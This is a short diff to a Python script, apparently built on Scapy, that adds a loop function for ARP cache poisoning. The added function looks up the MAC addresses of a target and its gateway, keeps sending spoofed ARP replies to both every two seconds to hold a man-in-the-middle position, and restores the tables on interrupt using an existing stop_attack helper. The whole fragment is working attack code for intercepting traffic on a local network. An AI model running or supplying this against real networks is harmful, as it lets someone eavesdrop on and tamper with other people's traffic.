@@ -42,3 +42,18 @@ def stop_attack(target_ip, real_ip, target_mac, real_mac):
     packet = sc.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=real_ip, hwsrc=real_mac)
     sc.send(packet, count=4, verbose=False)
 
+## Now to start the attack, keep it goining, and stop it when we want.
+# We try to keep the ARP table of the target poisoned by sending packets in a loop.
+def arp_poison_loop(target_ip, gateway_ip):
+    try:
+        target_mac = get_mac(target_ip)
+        gateway_mac = get_mac(gateway_ip)
+        # Start loop
+        while True:
+            poison(target_ip, gateway_ip, target_mac)
+            poison(gateway_ip, target_ip, gateway_mac)
+            sc.time.sleep(2)
+    except KeyboardInterrupt:
+        stop_attack(target_ip, gateway_ip, target_mac, gateway_mac)
+        stop_attack(gateway_ip, target_ip, gateway_mac, target_mac)
+
